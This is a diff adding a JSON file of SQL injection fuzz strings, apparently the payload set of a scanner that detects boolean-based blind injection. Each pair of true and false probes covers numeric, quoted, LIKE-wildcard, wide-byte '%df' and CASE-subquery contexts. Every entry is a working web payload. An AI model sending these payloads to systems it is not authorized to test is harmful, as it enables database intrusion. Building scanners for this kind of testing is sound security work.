@@ -1,0 +1,118 @@
+{
+  "numeral": [
+    [
+      {"fuzzstr":" AND 502=503","condition": false},
+      {"fuzzstr":" AND 501=501","condition": true},
+      {"fuzzstr":" AND 501=502","condition": false},
+      {"fuzzstr":" AND 501-501=1","condition": false},
+      {"fuzzstr":" AND 501-501=0","condition": true},
+      {"fuzzstr":" AND 502-502=0","condition": true}
+    ],
+    [
+      {"fuzzstr":") AND 505=506 AND 1 in (1","condition": false},
+      {"fuzzstr":") AND 501=501 AND 1 in (1","condition": true},
+      {"fuzzstr":") AND 501=502 AND 1 in (1","condition": false},
+      {"fuzzstr":") AND 2=503-503 AND 1 in (1","condition": false},
+      {"fuzzstr":") AND 0=504-504 AND 1 in (1","condition": true},
+      {"fuzzstr":") AND 0=505-505 AND 1 in (1","condition": true}
+    ],
+    [
+      {"fuzzstr":" , (SELECT (CASE WHEN (501=(select 502)) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END))","condition": false},
+      {"fuzzstr":" , (SELECT (CASE WHEN (501=501) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END))","condition": true},
+      {"fuzzstr":" , (SELECT (CASE WHEN (501=502) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END))","condition": false},
+      {"fuzzstr":" , (SELECT (CASE WHEN (501-1=501) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END))","condition": false},
+      {"fuzzstr":" , (SELECT (CASE WHEN (ROW_COUNT()-1=ROW_COUNT()-1) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END))","condition": true},
+      {"fuzzstr":" , (SELECT (CASE WHEN (ROW_COUNT()-2=ROW_COUNT()-2) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END))","condition": true}
+    ]
+  ],
+  "character": [
+    [
+      {"fuzzstr":"' AND '501'='502","condition": false},
+      {"fuzzstr":"' AND '502'='502","condition": true},
+      {"fuzzstr":"' AND '502'='503","condition": false},
+      {"fuzzstr":"' AND '501'='503","condition": false},
+      {"fuzzstr":"' AND '503'='503","condition": true},
+      {"fuzzstr":"' AND '504'='504","condition": true}
+    ],
+    [
+      {"fuzzstr":"%' AND 501=503 AND '%'='","condition": false},
+      {"fuzzstr":"%' AND 501=501 AND '%'='","condition": true},
+      {"fuzzstr":"%' AND 501=502 AND '%'='","condition": false},
+      {"fuzzstr":"%' AND 502=503 AND '%'='","condition": false},
+      {"fuzzstr":"%' AND 503=503 AND '%'='","condition": true},
+      {"fuzzstr":"%' AND 504=504 AND '%'='","condition": true}
+    ],
+    [
+      {"fuzzstr":"') AND 507=509 AND '1' in ('1","condition": false},
+      {"fuzzstr":"') AND 508=508 AND '1' in ('1","condition": true},
+      {"fuzzstr":"') AND 507=508 AND '1' in ('1","condition": false},
+      {"fuzzstr":"') AND 7=508-508 AND '1' in ('1","condition": false},
+      {"fuzzstr":"') AND 0=508-508 AND '1' in ('1","condition": true},
+      {"fuzzstr":"') AND 0=509-509 AND '1' in ('1","condition": true}
+    ],
+    [
+      {"fuzzstr":"%df' AND 501=502#","condition": false},
+      {"fuzzstr":"%df' AND 501=501#","condition": true},
+      {"fuzzstr":"%df' AND 501=503#","condition": false},
+      {"fuzzstr":"%df' AND 502=503#","condition": false},
+      {"fuzzstr":"%df' AND 502=502#","condition": true},
+      {"fuzzstr":"%df' AND 503=503#","condition": true}
+    ],
+    [
+      {"fuzzstr":"' , (SELECT (CASE WHEN (501=(select 502)) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END)) )-- -","condition": false},
+      {"fuzzstr":"' , (SELECT (CASE WHEN (501=501) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END)) )-- -","condition": true},
+      {"fuzzstr":"' , (SELECT (CASE WHEN (501=502) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END)) )-- -","condition": false},
+      {"fuzzstr":"' , (SELECT (CASE WHEN (501-1=501) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END)) )-- -","condition": false},
+      {"fuzzstr":"' , (SELECT (CASE WHEN (ROW_COUNT()-1=ROW_COUNT()-1) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END)) )-- -","condition": true},
+      {"fuzzstr":"' , (SELECT (CASE WHEN (ROW_COUNT()-2=ROW_COUNT()-2) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END)) )-- -","condition": true}
+    ],
+    [
+      {"fuzzstr":"\" AND \"501\"=\"502","condition": false},
+      {"fuzzstr":"\" AND \"501\"=\"501","condition": true},
+      {"fuzzstr":"\" AND \"502\"=\"503","condition": false},
+      {"fuzzstr":"\" AND \"502\"=\"504","condition": false},
+      {"fuzzstr":"\" AND \"502\"=\"502","condition": true},
+      {"fuzzstr":"\" AND \"503\"=\"503","condition": true}
+    ],
+    [
+      {"fuzzstr":"%df\" AND 501=502#","condition": false},
+      {"fuzzstr":"%df\" AND 501=501#","condition": true},
+      {"fuzzstr":"%df\" AND 501=503#","condition": false},
+      {"fuzzstr":"%df\" AND 502=503#","condition": false},
+      {"fuzzstr":"%df\" AND 502=502#","condition": true},
+      {"fuzzstr":"%df\" AND 503=503#","condition": true}
+    ],
+    [
+      {"fuzzstr":"%\" AND 501=503 AND \"%\"=\"","condition": false},
+      {"fuzzstr":"%\" AND 501=501 AND \"%\"=\"","condition": true},
+      {"fuzzstr":"%\" AND 501=502 AND \"%\"=\"","condition": false},
+      {"fuzzstr":"%\" AND 502=503 AND \"%\"=\"","condition": false},
+      {"fuzzstr":"%\" AND 503=503 AND \"%\"=\"","condition": true},
+      {"fuzzstr":"%\" AND 504=504 AND \"%\"=\"","condition": true}
+    ],
+    [
+      {"fuzzstr":"\") AND 507=509 AND \"1\" in (\"1","condition": false},
+      {"fuzzstr":"\") AND 508=508 AND \"1\" in (\"1","condition": true},
+      {"fuzzstr":"\") AND 507=508 AND \"1\" in (\"1","condition": false},
+      {"fuzzstr":"\") AND 1=508-508 AND \"1\" in (\"1","condition": false},
+      {"fuzzstr":"\") AND 0=508-508 AND \"1\" in (\"1","condition": true},
+      {"fuzzstr":"\") AND 0=502-502 AND \"1\" in (\"1","condition": true}
+    ],
+    [
+      {"fuzzstr":"\" AND (SELECT (CASE WHEN (501=(select 502)) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END))-- -","condition": false},
+      {"fuzzstr":"\" AND (SELECT (CASE WHEN (501=501) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END))-- -","condition": true},
+      {"fuzzstr":"\" AND (SELECT (CASE WHEN (501=502) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END))-- -","condition": false},
+      {"fuzzstr":"\" AND (SELECT (CASE WHEN (501-1=501) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END))-- -","condition": false},
+      {"fuzzstr":"\" AND (SELECT (CASE WHEN (ROW_COUNT()-1=ROW_COUNT()-1) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END))-- -","condition": true},
+      {"fuzzstr":"\" AND (SELECT (CASE WHEN (ROW_COUNT()-2=ROW_COUNT()-2) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END))-- -","condition": true}
+    ],
+    [
+      {"fuzzstr":"\" , (SELECT (CASE WHEN (501=(select 502)) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END)) )-- -","condition": false},
+      {"fuzzstr":"\" , (SELECT (CASE WHEN (501=501) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END)) )-- -","condition": true},
+      {"fuzzstr":"\" , (SELECT (CASE WHEN (501=502) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END)) )-- -","condition": false},
+      {"fuzzstr":"\" , (SELECT (CASE WHEN (501-1=501) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END)) )-- -","condition": false},
+      {"fuzzstr":"\" , (SELECT (CASE WHEN (ROW_COUNT()-1=ROW_COUNT()-1) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END)) )-- -","condition": true},
+      {"fuzzstr":"\" , (SELECT (CASE WHEN (ROW_COUNT()-2=ROW_COUNT()-2) THEN 1 ELSE (SELECT 1 FROM (select 1 union select 2)x) END)) )-- -","condition": true}
+    ]
+  ]
+}
